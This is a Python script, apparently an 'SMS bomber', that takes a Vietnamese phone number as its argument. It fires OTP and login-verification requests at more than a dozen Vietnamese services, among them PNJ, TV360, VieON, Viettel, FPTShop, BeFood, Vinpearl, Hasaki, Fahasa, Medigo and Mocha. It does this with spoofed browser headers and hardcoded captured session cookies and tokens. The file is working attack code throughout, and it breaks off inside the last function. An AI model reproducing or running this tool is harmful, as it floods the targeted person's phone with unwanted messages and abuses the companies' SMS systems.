import requests
import time
import sys
import urllib3
from colorama import Fore, Style, init
import concurrent.futures
import json
import random
import string
import os

def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    email = f'{email_name}@{domain}'
    return email

random_email = generate_random_email()
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs='/path/to/your/certificate-authority-bundle-file'
)


sdt = sys.argv[1]
count = 1

print("Số điện thoại:", sdt)
print("Số lần lặp:", count)

count = int(count)

if count > 10:
    count = 10

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)

def pnj():


    cookies = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': sdt,
    }
    try:
        response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PNJ | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PNJ | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieon():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptshop():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/json',
        'Referer': 'https://fptshop.com.vn/',
        'order-channel': '1',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def befood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': sdt_chuyen_doi,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodhubzl(): # check ap
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': sdt,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vttelecom():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'lang': 'vi',
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp', params=params, headers=headers)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinwonders():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt_chuyen_doi,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'sessionChecked': '1733243335',
        'HASAKI_SESSID': 'b4f9a3141d969a5e713baeeb62cddecc',
        'form_key': 'b4f9a3141d969a5e713baeeb62cddecc',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'd7q25iv138vv8kvqi4saublpbk',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def fahasa():
    cookies = {
        'frontend': '732d867ee6ea46ea86186fd679b0607a',
        'utm_source': 'google',
        'frontend_cid': '85UO0HdWkJWztVfl',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=732d867ee6ea46ea86186fd679b0607a; utm_source=google; frontend_cid=85UO0HdWkJWztVfl',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL) 

def medigozl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def medigosms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': sdt,
        'languageCode': 'vi',
    }

    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def liena():
    cookies = {
        'form_key': '16TAQkcEJWNL9mpA',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'PHPSESSID': 'dc89004ebe3f7d6ddcf4413416fe8486',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'form_key=16TAQkcEJWNL9mpA; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=dc89004ebe3f7d6ddcf4413416fe8486',
        'origin': 'https://www.liena.com.vn',
        'priority': 'u=1, i',
